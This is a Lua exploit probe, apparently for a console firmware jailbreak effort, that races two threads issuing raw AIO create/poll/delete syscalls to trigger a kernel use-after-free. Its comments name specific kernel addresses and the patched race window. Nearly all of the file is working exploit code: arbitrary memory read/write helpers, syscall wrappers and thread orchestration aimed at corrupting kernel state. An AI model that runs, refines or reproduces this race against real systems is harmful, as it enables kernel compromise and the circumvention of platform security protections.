-- CRASH_CLASS: HIGH
-- PROBE 1042a: the aio delete race, run with real concurrency for the first time.
-- 1041a proved the loader's `run_lua_code_in_new_thread` works on 14.10, so two Lua states
-- can issue syscalls at the same moment.  Every previous aio race had to spawn a
-- thr_create child per attempt (30-40 rounds) and never overlapped at call granularity.
-- Here two Lua threads each run create(669) -> poll(664) -> delete(662) in a tight loop, so
-- one thread's delete can drop the bucket lock at 0x3afe67 and another thread's create can
-- take the freed slot before the delete's re-lookup at 0x3afe7c - the exact window the
-- 14.20 generation-ID fix closes.  A hit shows up as a panicking process; a miss as clean
-- counters.  Each thread has its own descriptor/out/status buffers.
print("=== PROBE 1042a ===")
local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function wd(a,v) pcall(function() memory.write_dword(uint64(a),uint64(v)) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(uint64(a)) end); if o then return to_num(v) end return -1 end
local function ad(x) return tonumber(tostring(x):match("0x(%x+)"),16) end

local ROUNDS = 20000
local NTHREADS = 2

local fds=memory.alloc(8); local sock=-1
wd(fds,0xFFFFFFFF); wd(fds+4,0xFFFFFFFF)
local okg,svg=pcall(function() return mk(135)(uint64(1),uint64(1),uint64(0),uint64(fds)) end)
sock=rd(fds)
print(string.format("[A] socketpair ok=%s rv=%s fd=%d", tostring(okg), tostring(to_num(svg)), sock))

local base=memory.alloc(0x400); local ba=ad(base)
for o=0,0x3F8,8 do wq(ba+o,0) end

-- per-thread buffers: D, out, st, res
local B={}
for t=1,NTHREADS do
  local D=memory.alloc(0x100); local out=memory.alloc(8); local st=memory.alloc(0x40); local res=memory.alloc(0x40)
  local da,oa,sa,ra=ad(D),ad(out),ad(st),ad(res)
  for o=0,0xF8,8 do wq(da+o,0) end
  wq(oa,0); wd(oa,0); wd(sa,0); wd(ra,0)
  B[t]={D=da,out=oa,st=sa,res=ra}
end

local SRC = [[
local BASE=%d
local SOCK=%d
local ROUNDS=%d
local SLOT=%d
local D=%d
local OUT=%d
local ST=%d
local RES=%d
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function wd(a,v) pcall(function() memory.write_dword(uint64(a),uint64(v)) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(uint64(a)) end) if o then local n=v.tonumber and v:tonumber() or v return tonumber(n) or 0 end return -1 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local sc_c, sc_p, sc_d = mk(669), mk(664), mk(662)
local okpid,rvpid = pcall(function() return mk(20)() end)
wd(BASE+SLOT+0x70, okpid and 1 or 0)
local pn = 0
if okpid then pn = (rvpid and rvpid.tonumber) and rvpid:tonumber() or 0 end
wd(BASE+SLOT+0x74, pn)
local crerr, crmiss, pol, del, delnv = 0, 0, 0, 0, 0
for i=1,ROUNDS do
  wq(D+0x00,0); wq(D+0x08,0); wq(D+0x10,RES); wq(D+0x18,RES)
  wd(D+0x20,SOCK); wd(D+0x24,0)
  wd(OUT,0)
  local ok=pcall(function() sc_c(uint64(0x1001),uint64(D),uint64(1),uint64(1),uint64(OUT)) end)
  local id=rd(OUT)
  if not ok then crerr=crerr+1
  elseif id==0 then crmiss=crmiss+1
  else
    wd(RES,id); wd(ST,0)
    local okp=pcall(function() sc_p(uint64(RES),uint64(1),uint64(ST),uint64(0),uint64(0),uint64(0)) end)
    if okp then pol=pol+1 end
    local okd,rvd=pcall(function() return sc_d(uint64(RES),uint64(1),uint64(ST)) end)
    if okd then
      del=del+1
      if rd(ST)~=0 then delnv=delnv+1 end
    end
  end
  if i %% 1000 == 0 then
    wq(BASE+SLOT,i); wd(BASE+SLOT+0x40,crerr); wd(BASE+SLOT+0x48,crmiss)
    wd(BASE+SLOT+0x50,pol); wd(BASE+SLOT+0x58,del); wd(BASE+SLOT+0x60,delnv)
  end
end
wq(BASE+SLOT,ROUNDS); wd(BASE+SLOT+0x40,crerr); wd(BASE+SLOT+0x48,crmiss)
wd(BASE+SLOT+0x50,pol); wd(BASE+SLOT+0x58,del); wd(BASE+SLOT+0x60,delnv)
wd(BASE+SLOT+0x68,1)
]]

local th={}
for t=1,NTHREADS do
  local b=B[t]
  local src=string.format(SRC, ba, sock, ROUNDS, t*0x100, b.D, b.out, b.st, b.res)
  local ok,err=pcall(function() return run_lua_code_in_new_thread(src,{async=true}) end)
  print(string.format("[S] thread %d spawn ok=%s", t, tostring(ok)))
  th[t]=ok
end

local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end

for w=1,120 do
  sleep_ms(250)
  local line="[P]"
  local all=true
  for t=1,NTHREADS do
    local off=t*0x100
    local r=rd(ba+off); local done=rd(ba+off+0x68)
    if done==0 then all=false end
    line=line..string.format(" t%d=%d/%d", t, r, done)
  end
  if w%1==0 then
    print(line..string.format(" pid0ok=%d pid0=%d", rd(ba+0x180), rd(ba+0x184)))
  end
  if all then print(line.." ALL-DONE") break end
end
local tot,dl,dnz,pl,ce,mi=0,0,0,0,0,0
for t=1,NTHREADS do
  local o=ba+t*0x100
  tot=tot+rd(o); pl=pl+rd(o+0x50); dl=dl+rd(o+0x58)
  dnz=dnz+rd(o+0x60); ce=ce+rd(o+0x40); mi=mi+rd(o+0x48)
end
print(string.format("[C] rounds=%d del=%d del_nz=%d poll=%d crerr=%d miss=%d", tot, dl, dnz, pl, ce, mi))
print("[Z] alive pid="..tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
